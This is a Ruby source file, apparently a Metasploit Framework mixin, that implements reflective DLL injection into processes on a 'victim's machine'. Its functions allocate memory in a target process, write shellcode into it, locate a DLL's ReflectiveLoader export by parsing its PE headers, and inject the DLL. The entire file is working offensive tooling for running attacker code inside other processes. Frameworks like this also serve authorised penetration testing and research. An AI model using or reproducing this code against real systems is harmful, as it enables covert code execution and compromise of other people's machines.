# -*- coding: binary -*-

###
#
# This module exposes functionality which makes it easier to do
# Reflective DLL Injection into processes on a victim's machine.
#
###

module Msf::RdiMixin

  PAGE_ALIGN = 1024

  #
  # Inject the given shellcode into a target process.
  #
  # +process+ - The process to inject the shellcode into.
  # +shellcode+ - The shellcode to inject.
  #
  # @return Address of the shellcode in the target process's memory.
  #
  def inject_into_process(process, shellcode)
    shellcode_size = shellcode.length

    unless shellcode.length % PAGE_ALIGN == 0
      shellcode_size += PAGE_ALIGN - (shellcode.length % PAGE_ALIGN)
    end

    shellcode_mem = process.memory.allocate(shellcode_size)
    process.memory.protect(shellcode_mem)
    process.memory.write(shellcode_mem, shellcode)

    return shellcode_mem
  end

  #
  # Load a reflectively-injectable DLL from disk and find the offset
  # to the ReflectiveLoader function inside the DLL.
  #
  # +dll_path+ - Path to the DLL to load.
  #
  # #return Tuple of DLL contents and offset to the +ReflectiveLoader+
  #         function within the DLL.
  #
  def load_rdi_dll(dll_path)
    dll = ''
    offset = nil

    ::File.open(dll_path, 'rb') { |f| dll = f.read }

    pe = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(dll))

    pe.exports.entries.each do |e|
      if e.name =~ /^\S*ReflectiveLoader\S*/
        offset = pe.rva_to_file_offset(e.rva)
        break
      end
    end

    return dll, offset
  end

  #
  # Inject a reflectively-injectable DLL into the given process
  # using reflective injection.
  #
  # +process+ - The process that will have the DLL injected into it.
  # +dll_path+ - Path to the DLL that is to be loaded and injected.
  #
  # @return Tuple of allocated memory address and offset to the
  #         +ReflectiveLoader+ function.
  #
  def inject_dll_into_process(process, dll_path)
    dll, offset = load_rdi_dll(dll_path)
    dll_mem = inject_into_process(process, dll)

    return dll_mem, offset
  end

end
